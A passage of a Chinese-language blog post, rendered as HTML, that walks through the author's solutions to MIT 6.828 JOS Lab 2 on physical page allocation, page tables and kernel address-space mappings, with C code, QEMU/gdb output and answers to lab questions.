class="comment">// return address</span></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In mem_init():</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Allocate an array of npages 'struct PageInfo's and store it in 'pages'.</span></span><br><span class="line"><span class="comment">// The kernel uses this array to keep track of physical pages: for</span></span><br><span class="line"><span class="comment">// each physical page, there is a corresponding struct PageInfo in this</span></span><br><span class="line"><span class="comment">// array.  'npages' is the number of physical pages in memory.  Use memset</span></span><br><span class="line"><span class="comment">// to initialize all fields of each struct PageInfo to 0.</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line"><span class="comment">// get size of pages</span></span><br><span class="line"><span class="keyword">uint32_t</span> pages_size = <span class="keyword">sizeof</span>(struct PageInfo) * npages;</span><br><span class="line"><span class="comment">// use boot_alloc to allocate memory</span></span><br><span class="line">pages = (struct PageInfo *) boot_alloc(pages_size);</span><br><span class="line"><span class="comment">// initialization</span></span><br><span class="line"><span class="built_in">memset</span>(pages, <span class="number">0</span>, pages_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_init():</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize from page 1 to page npages_basemem - 1</span></span><br><span class="line"><span class="comment">// set pp_ref to 0, set pp_link to last page_free_list</span></span><br><span class="line"><span class="comment">// and then update page_free_list</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span> ; i &lt; npages_basemem ; i++) &#123;</span><br><span class="line">    pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">    pages[i].pp_link = page_free_list;</span><br><span class="line">    page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate next free page and initialize corresponding pages entry</span></span><br><span class="line"><span class="comment">// convert from kernel virtual address to physical address</span></span><br><span class="line"><span class="keyword">size_t</span> next_free_page = PADDR(boot_alloc(<span class="number">0</span>)) / PGSIZE;</span><br><span class="line">pages[next_free_page].pp_link = &amp;pages[npages_basemem - <span class="number">1</span>];</span><br><span class="line">page_free_list = &amp;pages[next_free_page];</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize remaining pages entry</span></span><br><span class="line"><span class="keyword">for</span> (i = next_free_page + <span class="number">1</span> ; i &lt; npages ; i++) &#123;</span><br><span class="line">    pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">    pages[i].pp_link = page_free_list;</span><br><span class="line">    page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_alloc():</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">// get first element in free list</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">page_ptr</span> = <span class="title">page_free_list</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (page_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">// NOT out of memory</span></span><br><span class="line">		<span class="comment">// update free list</span></span><br><span class="line">		page_free_list = page_free_list-&gt;pp_link;</span><br><span class="line">		<span class="comment">// get kernal virtual address from given page</span></span><br><span class="line">		<span class="keyword">char</span> * addr = page2kva(page_ptr);</span><br><span class="line">		<span class="comment">// set pp_link to NULL to allow double-free bugs check</span></span><br><span class="line">		page_ptr-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="comment">// ALLOC_ZERO set, use memset to initialze physical page</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_flags &amp; ALLOC_ZERO) &#123;</span><br><span class="line">			<span class="built_in">memset</span>(addr, <span class="number">0</span>, PGSIZE);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// return page</span></span><br><span class="line">		<span class="keyword">return</span> page_ptr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_free():</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">page_free(struct PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Fill this function in</span></span><br><span class="line">	<span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line">	<span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//check pp_ref and pp_link</span></span><br><span class="line">	<span class="keyword">if</span> (pp-&gt;pp_ref != <span class="number">0</span>) &#123;</span><br><span class="line">		panic(<span class="string">"page's reference count is non-zero!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pp-&gt;pp_link != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		panic(<span class="string">"double free error when free page!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// return page to free list</span></span><br><span class="line">	pp-&gt;pp_link = page_free_list;</span><br><span class="line">	page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后启动JOS，在终端观察到如下输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Physical memory: 131072K available, base = 640K, extended = 130432K</span><br><span class="line">check_page_free_list() succeeded!</span><br><span class="line">check_page_alloc() succeeded!</span><br></pre></td></tr></table></figure></p>
<p>证明内存分配器工作正常。</p>
<h3 id="第二部分-Virtual-Memory-虚拟内存"><a href="#第二部分-Virtual-Memory-虚拟内存" class="headerlink" title="第二部分 Virtual Memory - 虚拟内存"></a>第二部分 Virtual Memory - 虚拟内存</h3><p>练习2：阅读<a href="https://pdos.csail.mit.edu/6.828/2017/readings/i386/toc.htm" target="_blank" rel="noopener">Intel 80386 Reference Manual</a>的第五章和第六章。主要阅读页翻译和页保护机制的部分。同时，也要对x86的分段机制有所了解。</p>
<h4 id="虚拟地址、线性地址和物理地址"><a href="#虚拟地址、线性地址和物理地址" class="headerlink" title="虚拟地址、线性地址和物理地址"></a>虚拟地址、线性地址和物理地址</h4><p>在x86中，虚拟地址由段选择子和段内偏移组成，通过段翻译机制，得到线性地址。线性地址经过页翻译机制，得到物理地址。物理地址就是实际的内存位置。</p>
<p>在实验1中，已经将线性地址<code>0-4M</code>映射到了虚拟地址<code>0-4M</code>和<code>KERNBASE-KERNBASE+4M</code>。在本实验中，要将物理内存的低256M映射到从<code>KERNBASE</code>开始的虚拟地址。此外，还要映射其他几个虚拟地址空间。（<code>KERNBASE</code>为<code>0xf0000000</code>）</p>
<p>练习3：在QEMU监视器中使用<code>xp</code>命令检查物理内存<code>0x00100000</code>处的字，在gdb中使用<code>x</code>命令检查虚拟内存<code>0xf0100000</code>处的字，观察结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(qemu) xp 0x00100000</span><br><span class="line">0000000000100000: 0x1badb002</span><br><span class="line">(gdb) x/x 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start+4026531828&gt;: 0x1badb002</span><br></pre></td></tr></table></figure><br>可以得出，物理地址0x00100000和虚拟地址0xf0100000上具有相同的数据。</p>
<p><code>info pg</code>和<code>info mem</code>的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(qemu) info pg</span><br><span class="line">VPN range     Entry         Flags        Physical page</span><br><span class="line">[00000-003ff]  PDE[000]     ----A----P</span><br><span class="line">  [00000-00000]  PTE[000]     --------WP 00000</span><br><span class="line">  [00001-0009f]  PTE[001-09f] ---DA---WP 00001-0009f</span><br><span class="line">  [000a0-000b7]  PTE[0a0-0b7] --------WP 000a0-000b7</span><br><span class="line">  [000b8-000b8]  PTE[0b8]     ---DA---WP 000b8</span><br><span class="line">  [000b9-000ff]  PTE[0b9-0ff] --------WP 000b9-000ff</span><br><span class="line">  [00100-00103]  PTE[100-103] ----A---WP 00100-00103</span><br><span class="line">  [00104-00119]  PTE[104-119] --------WP 00104-00119</span><br><span class="line">  [0011a-0011a]  PTE[11a]     ---DA---WP 0011a</span><br><span class="line">  [0011b-0011c]  PTE[11b-11c] --------WP 0011b-0011c</span><br><span class="line">  [0011d-003ff]  PTE[11d-3ff] ---DA---WP 0011d-003ff</span><br><span class="line">[f0000-f03ff]  PDE[3c0]     ----A---WP</span><br><span class="line">  [f0000-f0000]  PTE[000]     --------WP 00000</span><br><span class="line">  [f0001-f009f]  PTE[001-09f] ---DA---WP 00001-0009f</span><br><span class="line">  [f00a0-f00b7]  PTE[0a0-0b7] --------WP 000a0-000b7</span><br><span class="line">  [f00b8-f00b8]  PTE[0b8]     ---DA---WP 000b8</span><br><span class="line">  [f00b9-f00ff]  PTE[0b9-0ff] --------WP 000b9-000ff</span><br><span class="line">  [f0100-f0103]  PTE[100-103] ----A---WP 00100-00103</span><br><span class="line">  [f0104-f0119]  PTE[104-119] --------WP 00104-00119</span><br><span class="line">  [f011a-f011a]  PTE[11a]     ---DA---WP 0011a</span><br><span class="line">  [f011b-f011c]  PTE[11b-11c] --------WP 0011b-0011c</span><br><span class="line">  [f011d-f03ff]  PTE[11d-3ff] ---DA---WP 0011d-003ff</span><br><span class="line"></span><br><span class="line">  (qemu) info mem</span><br><span class="line">  0000000000000000-0000000000400000 0000000000400000 -r-</span><br><span class="line">  00000000f0000000-00000000f0400000 0000000000400000 -rw</span><br></pre></td></tr></table></figure></p>
<p>在JOS内核中，<code>uintptr_t</code>代表虚拟地址，<code>physaddr_t</code>代表物理地址，它们都只是<code>uint32_t</code>的别名。因此，不能直接对其（int类型）解引用，需要先将其转换成指针类型。<br>对物理地址的解引用是错误的，因为MMU会将其当做虚拟地址，你将无法得到正确的内存内容。</p>
<p>问题1：<br>x的类型应当为<code>uintptr_t</code>，因为对其进行了解引用操作，所以x应当为虚拟地址。</p>
<p>有些时候，内核必须要处理物理地址，这也是要把0-4M映射到KERNBASE-KERNBASE+4M的理由。<br>为了能使内核读写物理地址，必须要加上KERNBASE，可以通过宏KADDR(pa)实现。<br>同理，有时候需要能通过虚拟地址找到物理地址，需要减去KERNBASE，可以通过宏PADDR(va)实现。</p>
<h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>在未来的实验中很可能将同样的物理页映射到多个虚拟地址，你需要在<code>struct PageInfo</code>的<code>pp_ref</code>域中保持物理页被引用的次数，当引用计数归0，页面不再被使用，可以被释放。<br>总的来说，引用计数应当等于物理页面在<code>UTOP</code>之下出现的次数（<code>UTOP</code>之上的物理页面大多在启动时被内核分配并且永远不应当被释放，所以不需要对其进行引用计数）。<br>引用计数也会被用来追踪指向页目录页的指针数，以及页目录对页表页的引用数。</p>
<p>在使用<code>page_alloc()</code>时应当小心，返回页的<code>pp_ref</code>应当很快被递增，如被别的函数如(<code>page_insert()</code>)递增，在某些情况下，调用<code>page_insert()</code>的函数必须手动增加引用计数。</p>
<h4 id="页表管理"><a href="#页表管理" class="headerlink" title="页表管理"></a>页表管理</h4><p>需要编写管理页表的例程：插入和删除线性地址到物理地址的映射，当需要时创建页表等。</p>
<p>在练习4中遇到的问题总结如下：</p>
<ul>
<li>pgdir_walk在设置页表项时应当使用物理地址，在返回指针时应当返回虚拟地址。这是因为此时实际的二级页表还未被设置应用，且0-4M被映射为只读，而KERNBASE-KERNBASE+4M被映射为可读可写。需要使用给出的宏而不要自己加减</li>
<li>将PTE_P笔误成PTE_G</li>
<li>在page_insert中提前将引用计数pp_ref自增就可以避免边界情况的错误</li>
<li>pgdir_walk中对于页目录的设置可以更宽松，否则可能会对之后的实验产生影响</li>
</ul>
<p>练习4的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In pgdir_walk():</span></span><br><span class="line"><span class="keyword">pte_t</span> *pgdir_walk(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">int</span> create) &#123;</span><br><span class="line">    <span class="comment">// get page directory index and page directory entry</span></span><br><span class="line">    <span class="keyword">size_t</span> pgdir_index = PDX(va);</span><br><span class="line">    <span class="keyword">pde_t</span>  pgdir_entry = pgdir[pgdir_index];</span><br><span class="line">    <span class="comment">// get page table index</span></span><br><span class="line">    <span class="keyword">size_t</span> pgtable_index = PTX(va);</span><br><span class="line">    <span class="keyword">if</span> ((pgdir_entry &amp; PTE_P) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// page table page exists</span></span><br><span class="line">        <span class="comment">// get address of page table</span></span><br><span class="line">        <span class="keyword">pte_t</span> *pgtable = KADDR(PTE_ADDR(pgdir_entry));</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">pte_t</span> *)(pgtable + pgtable_index);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// page table page doesn't exist</span></span><br><span class="line">        <span class="keyword">if</span> (create == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">// create flag is false, returns NULL</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// allocate a new page table page</span></span><br><span class="line">            struct PageInfo *page = page_alloc(ALLOC_ZERO);</span><br><span class="line">            <span class="keyword">if</span> (page == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// allocation fails</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// increase physical page's reference count</span></span><br><span class="line">                page-&gt;pp_ref++;</span><br><span class="line">                <span class="comment">// get physical address of physical page</span></span><br><span class="line">                <span class="keyword">physaddr_t</span> page_pa = page2pa(page);</span><br><span class="line">                <span class="comment">// insert page table into page directory</span></span><br><span class="line">                pgdir[pgdir_index] = page_pa | PTE_W | PTE_U | PTE_P;</span><br><span class="line">                <span class="comment">// NB: returns KERNEL VIRTUAL ADDRESS here, for 0-4M is NOT</span></span><br><span class="line">                <span class="comment">// writable</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">pte_t</span> *)page2kva(page) + pgtable_index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In boot_map_region():</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">boot_map_region</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> va, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">physaddr_t</span> pa, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// round up size</span></span><br><span class="line">    size = ROUNDUP(size, PGSIZE);</span><br><span class="line">    <span class="comment">// get the number of pages to be mapped</span></span><br><span class="line">    <span class="keyword">size_t</span> page_num = PGNUM(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; page_num; i++) &#123;</span><br><span class="line">        <span class="comment">// iterate through to get each pte_t * through pgdir_walk given virtual</span></span><br><span class="line">        <span class="comment">// address</span></span><br><span class="line">        <span class="keyword">pte_t</span> *pgtable_entry_ptr =</span><br><span class="line">            pgdir_walk(pgdir, (<span class="keyword">char</span> *)(va + i * PGSIZE), <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// set pte_t according to physical address and permission flags</span></span><br><span class="line">        *pgtable_entry_ptr = (pa + i * PGSIZE) | perm | PTE_P;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_lookup():</span></span><br><span class="line"><span class="function">struct PageInfo *<span class="title">page_lookup</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va, <span class="keyword">pte_t</span> **pte_store)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Fill this function in</span></span><br><span class="line">    <span class="keyword">pte_t</span> *pgtable_entry_ptr = pgdir_walk(pgdir, va, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (pgtable_entry_ptr &amp;&amp; ((*pgtable_entry_ptr) &amp; PTE_P) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pte_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// pte_store not zero, store the address of pte of the page in it</span></span><br><span class="line">            *pte_store = pgtable_entry_ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// converts from pa to page and returns</span></span><br><span class="line">        <span class="keyword">physaddr_t</span> pa = PTE_ADDR(*pgtable_entry_ptr);</span><br><span class="line">        <span class="keyword">return</span> pa2page(pa);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// no page mapped at va</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_remove():</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">page_remove</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Fill this function in</span></span><br><span class="line">    <span class="keyword">pte_t</span> *pgtable_entry_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// use page_lookup to get struct PageInfo</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">page</span> = <span class="title">page_lookup</span>(<span class="title">pgdir</span>, <span class="title">va</span>, &amp;<span class="title">pgtable_entry_ptr</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (page &amp;&amp; pgtable_entry_ptr) &#123;</span><br><span class="line">        <span class="comment">// if page mapped at va</span></span><br><span class="line">        <span class="comment">// decrease and try to free page</span></span><br><span class="line">        page_decref(page);</span><br><span class="line">        <span class="comment">// set page table entry to 0</span></span><br><span class="line">        *pgtable_entry_ptr = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// invalidate tlb</span></span><br><span class="line">        tlb_invalidate(pgdir, va);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In page_insert():</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">page_insert</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Fill this function in</span></span><br><span class="line">    <span class="comment">// try to get pointer to page table entry, created if needed</span></span><br><span class="line">    <span class="keyword">pte_t</span> *pgtable_entry_ptr = pgdir_walk(pgdir, va, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pgtable_entry_ptr) &#123;</span><br><span class="line">        <span class="comment">// page table cannot be allocated</span></span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// increase reference ahead of insertion to process CORNER CASE</span></span><br><span class="line">    pp-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((*pgtable_entry_ptr) &amp; PTE_P) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// exists page mapped at va</span></span><br><span class="line">        <span class="comment">// remove page and invalidate tlb</span></span><br><span class="line">        page_remove(pgdir, va);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get physical address of page</span></span><br><span class="line">    <span class="keyword">physaddr_t</span> pa = page2pa(pp);</span><br><span class="line">    <span class="comment">// insert page into page table</span></span><br><span class="line">    *pgtable_entry_ptr = pa | perm | PTE_P;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update permission flags of corresponding page directory</span></span><br><span class="line">    pgdir[PDX(va)] = pgdir[PDX(va)] | perm;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="第三部分-Kernel-Address-Space-内核地址空间"><a href="#第三部分-Kernel-Address-Space-内核地址空间" class="headerlink" title="第三部分 Kernel Address Space - 内核地址空间"></a>第三部分 Kernel Address Space - 内核地址空间</h3><p>JOS将32位的地址空间划为了两部分——用户环境（在Lab3中加载和运行）将控制低地址空间、而内核总是完全地控制高地址空间，由ULIM显式地划分地址空间。内核将占据约256M的地址空间。</p>
<p>尽管内核和用户内存位于同一地址空间，仍需要在x86的页表中使用权限位去保证用户代码仅能访问低地址空间。否则用户代码可能会覆写内核数据，导致故障。此外，用户代码还可能能从窃取其他用户、内核的私有数据。<br>在JOS中，用户环境将不具有ULIM以上任何内存的权限；只有内核可以读写这些内存。对于[UTOP, ULIM)，内核和用户都仅能读而不能写，该段内存主要用于向用户暴露某些内核的只读数据结构；最后，UTOP以下的地址空间由用户环境使用，由用户环境自行设置这些内存的权限。</p>
<p>练习5的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Now we set up virtual memory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map 'pages' read-only by the user at linear address UPAGES</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UPAGES -- kernel R, user R</span></span><br><span class="line"><span class="comment">//      (ie. perm = PTE_U | PTE_P)</span></span><br><span class="line"><span class="comment">//    - pages itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, pages_size, PADDR(pages), PTE_U | PTE_P);</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Use the physical memory that 'bootstack' refers to as the kernel</span></span><br><span class="line"><span class="comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span></span><br><span class="line"><span class="comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">// to be the kernel stack, but break this into two pieces:</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span></span><br><span class="line"><span class="comment">//       the kernel overflows its stack, it will fault rather than</span></span><br><span class="line"><span class="comment">//       overwrite memory.  Known as a "guard page".</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, PADDR(bootstack),</span><br><span class="line">                PTE_W | PTE_P);</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map all of physical memory at KERNBASE.</span></span><br><span class="line"><span class="comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span></span><br><span class="line"><span class="comment">//      the PA range [0, 2^32 - KERNBASE)</span></span><br><span class="line"><span class="comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span></span><br><span class="line"><span class="comment">// we just set up the mapping anyway.</span></span><br><span class="line"><span class="comment">// Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE, <span class="number">0xffffffff</span> - KERNBASE, <span class="number">0</span>, PTE_W | PTE_P);</span><br></pre></td></tr></table></figure></p>
<p>问题2：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Enrty</th>
<th style="text-align:center">Base Virtual Address</th>
<th style="text-align:center">Points to (logically)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1023</td>
<td style="text-align:center">0xFFC00000</td>
<td style="text-align:center">Physical Memory</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">……….</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">960</td>
<td style="text-align:center">0xF0000000</td>
<td style="text-align:center">First 4 MB on Physical Memory</td>
</tr>
<tr>
<td style="text-align:center">959</td>
<td style="text-align:center">0xEFC00000</td>
<td style="text-align:center">Kernel Stack</td>
</tr>
<tr>
<td style="text-align:center">957</td>
<td style="text-align:center">0xEF400000</td>
<td style="text-align:center">Kernel Page Directory</td>
</tr>
<tr>
<td style="text-align:center">956</td>
